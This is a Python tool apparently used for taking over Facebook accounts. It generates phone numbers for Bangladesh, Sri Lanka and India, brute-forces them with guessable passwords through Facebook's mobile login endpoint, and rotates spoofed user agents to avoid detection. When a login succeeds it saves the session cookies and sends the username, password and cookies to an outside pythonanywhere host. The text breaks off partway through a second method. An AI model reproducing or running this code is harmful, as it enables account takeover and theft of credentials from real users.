'''Script written by MR-SMILE'''

import os,time,string,random,json,uuid,sys,re,requests,base64
from concurrent.futures import ThreadPoolExecutor as threadpol

loop=0
oks,cps,numnx,mtd=[],[],[],[]

line=f"---------"
logo=f"""
  ______   ____    ____  _____  _____     ________  
.' ____ \ |_   \  /   _||_   _||_   _|   |_   __  | 
| (___ \_|  |   \/   |    | |    | |       | |_ \_| 
 _.____`.   | |\  /| |    | |    | |   _   |  _| _  
| \____) | _| |_\/_| |_  _| |_  _| |__/ | _| |__/ | 
 \______.'|_____||_____||_____||________||________| 
                                                    

┌─────────────────────────────────────────────┐
│ [♤] AUTH:          CHOYON                   │
│ [♤] FACEBOOK:      MR.SMILE                 │
│ [♤] STATUS:        FREE                     │
│ [♤] TOOLTYPE.      FILE&RANDOM CLONING      │
│ [♤] VERSION:       0.2                      │
└─────────────────────────────────────────────┘
"""
def clr_logo():os.system('clear');print(logo)

def randm_inp():
    clr_logo()
    print(f' [1] BD ')
    print(f' [2] SRI LANKA ')
    print(f' [3] IND  ')
    print(f' [0] EXIT\n{line}')
    option=input(f' CHOOSE OPTION : ')
    if option in ['1','A']:bd()
    elif option in ['2','B']:npl()
    elif option in ['3','C']:Ind()
    elif option in ['0','D']:exit()
    else:randm_inp()

def bd():
    clr_logo()
    print(f" EXAMPLE : 017 - 018 - 019 - 016\n{line}");sim_code = input(f" ENTER SIM CODE : ")
    clr_logo();print(f" EXAMPLE : 3000 - 5000 - 50000 - 99999\n{line}")
    try:LiMit = int(input(f" ENTER CREAK LIMIT : "))
    except ValueError:LiMit = 50000
    for number in range(LiMit):
        numx = ''.join(random.choice(string.digits) for i in range(8))
        numnx.append(numx)
    clr_logo()
    print(f" [1] MATHOD - A")
    print(f" [2] MATHOD - B")
    mthd_inn = input(f" CHOOSE MATHOD : ")
    if mthd_inn in ['a','A','1','01']:mtd.append("A")
    elif mthd_inn in ['b','B','2','02']:mtd.append("B")
    elif mthd_inn in ['c','C','3','03']:mtd.append("C")
    else:mtd.append("A")
    with threadpol(max_workers=40) as sifaxxx:
        clr_logo()
        total_l = str(len(numnx))
        print(f" TOTAL IDS : {total_l}\n SIM CODE : {sim_code}\n USE AIRPLANE MOD FOR GOOD RESULT\n{line}")
        for hugu in numnx:
            uid = sim_code+hugu
            passlist = [uid[:6],hugu[2:8],hugu[1:8],uid,hugu,'Bangladesh','bangladesh']
            if 'A' in mtd:sifaxxx.submit(rndm1,uid,passlist,total_l)
            elif 'B' in mtd:sifaxxx.submit(rndm2,uid,passlist,total_l)
            elif 'C' in mtd:sifaxxx.submit(rndm3,uid,passlist,total_l)
            elif 'D' in mtd:sifaxxx.submit(rndm4,uid,passlist,total_l)
    print(f"\n{line}\n CREAK PROCESS HAS BEEN COMPLITE \n TOTAL IDS : OK-{str(len(oks))}|CP-{str(len(cps))}\n FILE SAVE AS : sdcard/ok&cp.txt\n{line}");exit()
    
def npl():
    clr_logo()
    print(f" EXAMPLE : 9476 \n{line}");sim_code = input(f" ENTER SIM CODE : ")
    clr_logo();print(f" EXAMPLE : 3000 - 5000 - 50000 - 99999\n{line}")
    try:LiMit = int(input(f" ENTER CREAK LIMIT : "))
    except ValueError:LiMit = 50000
    for number in range(LiMit):
        numx = ''.join(random.choice(string.digits) for i in range(7))
        numnx.append(numx)
    clr_logo()
    print(f" [1] MATHOD - A")
    print(f" [2] MATHOD - B")
    mthd_inn = input(f" CHOOSE MATHOD : ")
    if mthd_inn in ['a','A','1','01']:mtd.append("A")
    elif mthd_inn in ['b','B','2','02']:mtd.append("B")
    elif mthd_inn in ['c','C','3','03']:mtd.append("C")
    else:mtd.append("A")
    with threadpol(max_workers=30) as sifaxxx:
        clr_logo()
        total_l = str(len(numnx))
        print(f" TOTAL IDS : {total_l}\n SIM CODE : {sim_code}\n USE AIRPLANE MOD FOR GOOD RESULT\n{line}")
        for hugu in numnx:
            uid = sim_code+hugu
            passlist = [uid[:6],hugu[2:8],hugu[1:8],uid,hugu,]
            if 'A' in mtd:sifaxxx.submit(rndm1,uid,passlist,total_l)
            elif 'B' in mtd:sifaxxx.submit(rndm2,uid,passlist,total_l)
            elif 'C' in mtd:sifaxxx.submit(rndm3,uid,passlist,total_l)
    print(f"\n{line}\n CREAK PROCESS HAS BEEN COMPLITE \n TOTAL IDS : OK-{str(len(oks))}|{c}CP-{str(len(cps))}\n FILE SAVE AS : sdcard/ok&cp.txt\n{line}");exit()
    
def Ind():
    clr_logo()
    print(f" EXAMPLE : 6390 - 6354 - 9340 - 9749\n{line}");sim_code = input(f" ENTER SIM CODE : ")
    clr_logo();print(f" EXAMPLE : 3000 - 5000 - 50000 - 99999\n{line}")
    try:LiMit = int(input(f" ENTER CREAK LIMIT : "))
    except ValueError:LiMit = 50000
    for number in range(LiMit):
        numx = ''.join(random.choice(string.digits) for i in range(6))
        numnx.append(numx)
    clr_logo()
    print(f" [1] MATHOD - A")
    print(f" [2] MATHOD - B")
    mthd_inn = input(f" CHOOSE MATHOD : ")
    if mthd_inn in ['a','A','1','01']:mtd.append("A")
    elif mthd_inn in ['b','B','2','02']:mtd.append("B")
    elif mthd_inn in ['c','C','3','03']:mtd.append("C")
    else:mtd.append("A")
    with threadpol(max_workers=30) as sifaxxx:
        clr_logo()
        total_l = str(len(numnx))
        print(f" TOTAL IDS : {total_l}\n SIM CODE : {sim_code}\n USE AIRPLANE MOD FOR GOOD RESULT\n{line}")
        for hugu in numnx:
            uid = sim_code+hugu
            passlist = [uid[:6],hugu[2:8],hugu[1:8],uid,hugu,'57273200','57575751','59039200','57575752']
            if 'A' in mtd:sifaxxx.submit(rndm1,uid,passlist,total_l)
            elif 'B' in mtd:sifaxxx.submit(rndm2,uid,passlist,total_l)
            elif 'C' in mtd:sifaxxx.submit(rndm3,uid,passlist,total_l)
    print(f"\n{line}\n CREAK PROCESS HAS BEEN COMPLITE \n TOTAL IDS : OK-{str(len(oks))}|{c}CP-{str(len(cps))}\n FILE SAVE AS : sdcard/ok&cp.txt\n{line}");exit()
    
def rndm1(uid,passlist,total_l):
    global loop,oks
    try:
        for pww in passlist:
            session = requests.Session()
            okkii=str(len(oks))
            cppii=str(len(cps))
            sys.stdout.write(f"\r\r [SMILE-M1] {loop}|OK-{okkii}  |{cppii}|");sys.stdout.flush()
            uuuu = ('A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z')
            sxrxn = ('SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H')
            sxrxr=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
            ua1 = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,13))+"; "+str(random.choice(sxrxr))+"; Windows 10 Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
            #ua2 = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(sxrxr))+" Build/"+str(random.choice(uuuu))+str(random.randint(111,9999))+") AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
            #ua3 = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(sxrxn))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
            #ua4 = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(sxrxn))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0.0.0 Mobile Safari/537.36"
            ua5 = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(sxrxr))+" Build/RP1A."+str(random.randint(111111,999999))+"."+str(random.randint(111,999))+"; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
            free_fb = session.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=2015199145383303&kid_directed_site=0&app_id=2015199145383303&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D2015199145383303%26auth_type%3Drerequest%26cbt%3D1710720741471%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df8a7657769a09bb64%2526domain%253Dapp.mobilemonkey.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fapp.mobilemonkey.com%25252Ff3c0980ed91ac9ef5%2526relation%253Dopener%26client_id%3D2015199145383303%26display%3Dtouch%26domain%3Dapp.mobilemonkey.com%26e2e%3D%257B%257D%26enable_profile_selector%3Dtrue%26fallback_redirect_uri%3Dhttps%253A%252F%252Fapp.mobilemonkey.com%252Flogin%253F_gl%253D1%252Auixtba%252A_ga%252ANjUwNDIzMzM1LjE2ODc5Mzc1MzI.%252A_ga_7H87JR2TFF%252AMTcxMDEzNTMyNi4xMzQuMS4xNzEwMTM1ODQ2LjU5LjAuMA..%26locale%3Den_US%26logger_id%3Dffaa7bee0f473e930%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df7f1c2ceb5bddfd9c%2526domain%253Dapp.mobilemonkey.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fapp.mobilemonkey.com%25252Ff3c0980ed91ac9ef5%2526relation%253Dopener%2526frame%253Df6f8ba0d863c55a3e%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Dpublic_profile%252Cemail%252Cbusiness_management%252Cpages_show_list%252Cads_read%252Cpages_manage_metadata%252Cpages_read_engagement%252Cpages_read_user_content%252Cpages_manage_ads%252Cpages_messaging%252Cads_management%26sdk%3Djoey%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df7f1c2ceb5bddfd9c%26domain%3Dapp.mobilemonkey.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fapp.mobilemonkey.com%252Ff3c0980ed91ac9ef5%26relation%3Dopener%26frame%3Df6f8ba0d863c55a3e%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr").text
            data = {'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            'try_number': '0',
            'unrecognized_tries': '0',
            'email': uid,
            'prefill_contact_point': '',
            'prefill_source': '',
            'prefill_type': '',
            'first_prefill_source': '',
            'first_prefill_type': '',
            'had_cp_prefilled': 'false',
            'had_password_prefilled': 'false',
            'is_smart_lock': 'true',
            'bi_xrwh': '0',
            'pass': pww,
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            '__dyn': '',
            '__csr': '',
            '__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),
            '__a': '',
            '__user': '0',
            '_fb_noscript': 'true'}
            head = {'Host': 'm.facebook.com',
            'Connection': 'keep-alive',
            'Content-Length': '2059',
            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
            'sec-ch-ua-model': '"SM-S928B"',
            'sec-ch-ua-mobile': '?1',
            'User-Agent': ua5,
            'viewport-width': '400',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-LSD': 'AVovWh_3iKg',
            'sec-ch-ua-platform-version': '"14.0.0"',
            'X-ASBD-ID': '129477',
            'dpr': '1.8',
            'sec-ch-ua-full-version-list': '"Google Chrome";v="105.0.5195.136", "Not)A;Brand";v="8.0.0.0", "Chromium";v="105.0.5195.136"',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua-platform': '"Android"',
            'Accept': '*/*',
            'Origin': 'https://m.facebook.com',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=2015199145383303&kid_directed_site=0&app_id=2015199145383303&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D2015199145383303%26auth_type%3Drerequest%26cbt%3D1710720741471%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df8a7657769a09bb64%2526domain%253Dapp.mobilemonkey.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fapp.mobilemonkey.com%25252Ff3c0980ed91ac9ef5%2526relation%253Dopener%26client_id%3D2015199145383303%26display%3Dtouch%26domain%3Dapp.mobilemonkey.com%26e2e%3D%257B%257D%26enable_profile_selector%3Dtrue%26fallback_redirect_uri%3Dhttps%253A%252F%252Fapp.mobilemonkey.com%252Flogin%253F_gl%253D1%252Auixtba%252A_ga%252ANjUwNDIzMzM1LjE2ODc5Mzc1MzI.%252A_ga_7H87JR2TFF%252AMTcxMDEzNTMyNi4xMzQuMS4xNzEwMTM1ODQ2LjU5LjAuMA..%26locale%3Den_US%26logger_id%3Dffaa7bee0f473e930%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df7f1c2ceb5bddfd9c%2526domain%253Dapp.mobilemonkey.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fapp.mobilemonkey.com%25252Ff3c0980ed91ac9ef5%2526relation%253Dopener%2526frame%253Df6f8ba0d863c55a3e%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Dpublic_profile%252Cemail%252Cbusiness_management%252Cpages_show_list%252Cads_read%252Cpages_manage_metadata%252Cpages_read_engagement%252Cpages_read_user_content%252Cpages_manage_ads%252Cpages_messaging%252Cads_management%26sdk%3Djoey%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df7f1c2ceb5bddfd9c%26domain%3Dapp.mobilemonkey.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fapp.mobilemonkey.com%252Ff3c0980ed91ac9ef5%26relation%3Dopener%26frame%3Df6f8ba0d863c55a3e%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',}
            url = "https://m.facebook.com/login/device-based/login/async/?api_key=2015199145383303&auth_token=b5920cf22a3a2e82bbf5c0e11fdbc15b&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D2015199145383303%26auth_type%3Drerequest%26cbt%3D1710720741471%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df8a7657769a09bb64%2526domain%253Dapp.mobilemonkey.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fapp.mobilemonkey.com%25252Ff3c0980ed91ac9ef5%2526relation%253Dopener%26client_id%3D2015199145383303%26display%3Dtouch%26domain%3Dapp.mobilemonkey.com%26e2e%3D%257B%257D%26enable_profile_selector%3Dtrue%26fallback_redirect_uri%3Dhttps%253A%252F%252Fapp.mobilemonkey.com%252Flogin%253F_gl%253D1%252Auixtba%252A_ga%252ANjUwNDIzMzM1LjE2ODc5Mzc1MzI.%252A_ga_7H87JR2TFF%252AMTcxMDEzNTMyNi4xMzQuMS4xNzEwMTM1ODQ2LjU5LjAuMA..%26locale%3Den_US%26logger_id%3Dffaa7bee0f473e930%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df7f1c2ceb5bddfd9c%2526domain%253Dapp.mobilemonkey.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fapp.mobilemonkey.com%25252Ff3c0980ed91ac9ef5%2526relation%253Dopener%2526frame%253Df6f8ba0d863c55a3e%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Dpublic_profile%252Cemail%252Cbusiness_management%252Cpages_show_list%252Cads_read%252Cpages_manage_metadata%252Cpages_read_engagement%252Cpages_read_user_content%252Cpages_manage_ads%252Cpages_messaging%252Cads_management%26sdk%3Djoey%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=2015199145383303&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df7f1c2ceb5bddfd9c%26domain%3Dapp.mobilemonkey.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fapp.mobilemonkey.com%252Ff3c0980ed91ac9ef5%26relation%3Dopener%26frame%3Df6f8ba0d863c55a3e%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100"
            po = session.post(url,data=data, headers=head,allow_redirects=False).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uidx=re.findall("c_user=(.*);xs", coki)[0]
                uid=str(uidx)
                ckk=f"https://graph.facebook.com/{uid}/picture?type=normal"
                res=requests.get(ckk).text
                if 'Photoshop' in res:
                    print(f"\r\r \x1b[38;5;196m[\033[38;5;46mSUCCESS-💚\x1b[38;5;196m] \033[38;5;46m{uid} \033[38;5;46m★ \033[38;5;46m{pww}")
                    print(f"\r\r COOKIES : {coki}\n")
                    requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_fb/txt={uid}|{pww}|{coki}")
                    open('/sdcard/RNDM-OK.txt','a').write(uid+'|'+pww+'|'+coki+'\n')
                    oks.append(uid)
                    break
                else:
                    break
            elif 'checkpoint' in log_cookies:
                ##print(f"\r\r\ [CP] {uid} | {pww}")
                open('/sdcard/RNDM-CP.txt','a').write(uid+'|'+pww+'\n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:time.sleep(10)
    except Exception as e:
        pass
        
def rndm2(uid,passlist,total_l):
    global loop,oks
    try:
        for pww in passlist:
            session = requests.Session()
            okkii=str(len(oks))
            cppii=str(len(cps))
            sys.stdout.write(f"\r\r [SMILE-M2] {loop}|OK-{okkii}  |{cppii}|");sys.stdout.flush()
            uuuu = ('A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z')
            mldmdl = str(random.choice((('SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 